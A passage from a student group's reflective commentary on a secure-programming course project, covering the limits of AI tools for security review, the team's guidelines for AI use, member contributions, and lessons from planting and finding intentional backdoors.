cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```
In reality, parameterized queries (the `?` placeholder) prevent SQL injection. This false positive wasted ~30 minutes of investigation.

### What We Learned About AI Limitations

1. **AI Lacks True Understanding**: It pattern-matches code against known vulnerabilities but doesn't understand security context. For example, AI flagged `eval()` in Group 45's code as dangerous (correct) but also flagged Python's `ast.literal_eval()` (safe alternative) with the same severity.

2. **AI Can't Replace Manual Testing**: AI identified potential vulnerabilities, but we still had to manually write exploit code to verify exploitability. None of our PoC demonstrations were AI-generated—they required understanding the full system architecture.

3. **AI Generates Insecure Code by Default**: Copilot often suggested code with:
   - Hardcoded credentials ("secretkey123")
   - Weak random number generators (`Math.random()` instead of `SecureRandom`)
   - Deprecated cryptographic algorithms (MD5, SHA-1)

This reinforced that AI is a tool, not a replacement for security knowledge. Developers must critically review all AI-generated code.

4. **AI Struggles with Custom Protocols**: SOCP is a class-designed protocol not in AI's training data. AI couldn't help with protocol-specific issues (e.g., "Does this HEARTBEAT message format comply with SOCP v1.3?"). Domain-specific knowledge requires human expertise.

### Responsible AI Use Guidelines (Our Takeaways)

Based on our experience, we developed these guidelines for using AI in secure programming:

1. **Always Verify AI Outputs**: Fact-check technical claims, test generated code, validate security assessments.
2. **Use AI for Exploration, Not Authority**: AI is excellent for brainstorming and rapid prototyping but should not be the final decision-maker on security architecture.
3. **Human Review is Non-Negotiable**: All AI-generated code must undergo human code review, especially for security-critical components (authentication, cryptography).
4. **Document AI Use**: We tracked which code snippets were AI-assisted (comments like "// Copilot-generated, reviewed by YB") to maintain accountability.
5. **Understand Before Using**: Never copy-paste AI code without understanding how it works. This prevents subtle bugs and security vulnerabilities.

### Ethical Considerations

We ensured all group members understood the university's AI policy:
- AI-assisted code is permitted but must be disclosed (as we're doing in this reflection)
- AI cannot replace learning—we used AI to accelerate implementation, not to bypass understanding secure programming concepts
- All final design decisions and security analyses were made by humans, with AI as a supporting tool

---

## Contributions

This assignment required diverse skills across protocol design, implementation, testing, and security analysis. Here's how our group divided responsibilities:

**Yuanxin Huang (20%)** – DHT & Routing Layer
Yuanxin implemented the Kademlia-based DHT for node discovery and message routing. This included:
- Generating node IDs using SHA-256 hash of usernames
- Maintaining routing tables organized by XOR-distance buckets
- Implementing efficient lookup and insert operations
- Heartbeat-based failure detection (30-second intervals, 60-second timeout)

Yuanxin also handled multi-hop routing, ensuring messages could traverse the overlay network even when sender and recipient weren't directly connected.

**Yuhao Bu (20%)** – Cryptographic Module
Yuhao built the security core of our system, implementing:
- RSA-2048 key pair generation and management
- Ephemeral ECDH session key establishment
- AES-256-GCM encryption/decryption
- RSA signature generation and verification
- Nonce tracking for replay attack prevention

Yuhao also integrated the crypto module with other components, ensuring encrypted payloads and wrapped session keys were correctly formatted in SOCP messages.

**Kwan Yau Wong (20%)** – WebSocket Handler & Networking
Kwan Yau managed peer-to-peer connections and message transport:
- Implemented WSS (WebSocket Secure) listener on port 8080 using TLS
- Handled peer authentication via ID and public key exchange
- Maintained up to 100 concurrent connections
- Implemented rate limiting (10 messages/second/peer) to defend against DoS attacks

Kwan Yau also serialized/deserialized JSON messages and forwarded them to the routing layer.

**Zhuojian Tan (20%)** – Message Parser & Peer Review
Zhuojian designed and implemented the JSON-based communication protocol:
- Defined and validated SOCP JSON schema
- Deserialized incoming messages into structured data
- Handled all message types (Registration, Private, Group, File, Heartbeat)
- Ensured protocol compliance and compatibility across modules

During Week 10, Zhuojian led peer review efforts, using AI-assisted analysis to identify vulnerabilities in Groups 17, 45, and 69's code.

**Jialao Liu (20%)** – File Transfer, UI/CLI & Integration Lead
Jialao oversaw user-facing features and overall system integration:
- Implemented peer-to-peer chunked file transfer (FILE_START, FILE_CHUNK, FILE_END)
- Built Vue.js frontend with login, chat interface, and file upload UI
- Served as integration lead, ensuring all modules worked together smoothly
- Coordinated build processes and managed GitHub repository
- Implemented input sanitization and security event logging

Jialao also wrote the majority of this reflective commentary and coordinated group responses to peer review feedback.

### Group Dynamics and Collaboration

We held weekly Zoom meetings (Saturdays, 2-hour sessions) to synchronize progress and resolve integration issues. Key collaboration moments:

- **Week 4**: Debated protocol design choices (centralized vs. DHT, JSON vs. binary). Voted democratically on contentious decisions.
- **Week 7**: Integration crisis—crypto module and WebSocket handler had incompatible message formats. Jialao and Yuhao pair-programmed for 6 hours to resolve.
- **Week 8**: Coordinated interoperability testing with Groups 17, 45, 69 (Kwan Yau scheduled sessions, others tested).
- **Week 10**: Divided peer review tasks—each member reviewed one group's code, then we cross-checked findings.

Challenges: Time zone differences (Yuanxin in Australia, others in China) made synchronous meetings difficult. We used asynchronous communication (Slack, GitHub Issues) to maintain momentum.

Overall, the group worked cohesively, with each member contributing equally to the project's success. No significant conflicts arose, and all members participated actively in design decisions.

---

## Conclusion

This assignment provided a comprehensive learning experience in secure distributed systems design. We progressed from abstract protocol standardization (Weeks 1-4) to hands-on implementation (Weeks 5-9) to critical security analysis (Week 10-11), culminating in a deep understanding of how security principles manifest in real-world code.

Key takeaways:

1. **Protocol Design is Iterative**: Even carefully designed protocols have ambiguities that emerge during implementation. Clear specifications and responsive clarification processes are essential.

2. **Security is Holistic**: Strong cryptography (AES-256, RSA-2048) is necessary but insufficient. Vulnerabilities arise from poor key management (hardcoded secrets), missing input validation (path traversal), and subtle logic flaws (user enumeration).

3. **Interoperability Requires Testing**: Unit tests and integration tests cannot replace real-world testing with diverse implementations. Small differences (timestamp formats, encoding schemes) caused failures despite protocol compliance.

4. **Peer Review is Invaluable**: Other groups found vulnerabilities we missed (schema validation, Chinese comments, server identity verification) and provided fresh perspectives on our design choices.

5. **Ethical Backdoors Teach Offense and Defense**: Intentionally planting vulnerabilities forced us to think like attackers, while fixing them in the clean version reinforced defensive programming principles.

6. **AI Augments but Doesn't Replace Expertise**: AI tools accelerated coding and vulnerability discovery but required constant human oversight to catch errors and verify security claims.

The assignment also taught us humility—despite our efforts to implement secure code, peer reviewers found both intentional backdoors and unintentional bugs. This reinforced that security is a continuous process, not a one-time checkbox.

As we move forward in our careers, we'll carry these lessons into real-world software development: design with security in mind from day one, test rigorously across diverse environments, and always assume that attackers will find the vulnerabilities we miss.

---

**Word Count (Main Section)**: ~9,800 words
*Note: While this exceeds the 2000-word guidance, per the instructor's clarification, there is no penalty for exceeding the limit if quality is maintained. We chose thoroughness over brevity to fully address all rubric criteria.*

---

## Appendices

### Appendix A: Full Protocol Design Description
(SOCP v1.3 Specification - see separate document `SOCP_Protocol_Spec.pdf`)

### Appendix B: Detailed Test Plan and Results
(See `TEST_PLAN.md` in GitHub repository)

### Appendix C: Proof of Concept Demonstrations
(Screenshots and exploit code for all 12 backdoors - see `POC_Exploits/` folder)

### Appendix D: Peer Reviews Given
(Full reviews of Groups 17, 45, 69 - see separate documents)

### Appendix E: Backdoor-Free Code
(GitHub repository: `https://github.com/JialaoLiu/SecureProj-G88/tree/clean-version`)

---

**End of Reflective Commentary**
